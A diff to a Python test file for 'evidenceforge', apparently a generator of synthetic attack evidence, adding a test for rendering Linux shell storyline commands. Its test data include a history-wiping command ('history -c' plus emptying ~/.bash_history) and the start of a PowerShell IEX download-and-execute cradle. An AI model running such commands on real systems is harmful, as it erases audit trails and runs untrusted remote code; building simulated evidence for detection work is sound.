@@ -10,11 +10,23 @@ from typing import Any
 
 from evidenceforge.events.contexts import FileTransferContext, HostContext
 from evidenceforge.generation.activity.generator import _zeek_conn_observation_time
-from evidenceforge.generation.engine.storyline import StorylineMixin
+from evidenceforge.generation.engine.storyline import (
+    StorylineMixin,
+    _linux_shell_process_command_line,
+)
 from evidenceforge.models.scenario import ConnectionEventSpec, System, User
 
 
 class TestStorylineCommandNetworks:
+    def test_linux_shell_storyline_process_renders_explicit_shell_invocation(self):
+        """Bare shell control syntax should be rendered as source-native bash -c argv."""
+        command_line = _linux_shell_process_command_line(
+            "/bin/bash",
+            "history -c && cat /dev/null > ~/.bash_history",
+        )
+
+        assert command_line == "bash -c 'history -c && cat /dev/null > ~/.bash_history'"
+
     def test_extract_http_url_from_powershell_download(self):
         url = StorylineMixin._extract_http_url(
             'powershell -nop -c "IEX (New-Object Net.WebClient).DownloadString('
